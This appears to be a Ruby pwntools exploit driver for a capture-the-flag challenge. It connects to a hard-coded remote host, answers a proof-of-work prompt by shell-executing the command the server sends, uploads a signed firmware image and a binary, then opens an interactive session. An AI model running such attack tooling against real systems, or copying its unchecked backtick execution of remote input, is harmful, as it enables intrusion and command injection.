#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'pwn'        # https://github.com/peter50216/pwntools-ruby

host, port = '52.197.161.60', 3154
$z = Sock.new(host, port)
def z;$z;end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pow
  z.gets "Proof of Work - Give me the token of:\n"
  cmd = z.gets.strip
  z.puts `#{cmd}`
end
pow

def upload(f)
  log.info "Uploading #{f}"
  z.gets 'y/N'
  z.puts 'y'
  data = IO.binread(f)
  z.gets 'MAX'
  z.puts data.size
  z.gets 'Reading'
  z.write data
end

upload(File.join(__dir__, 'build', 'firmware.bin.signed'))
upload(File.join(__dir__, 'build', 'go'))

z.interact
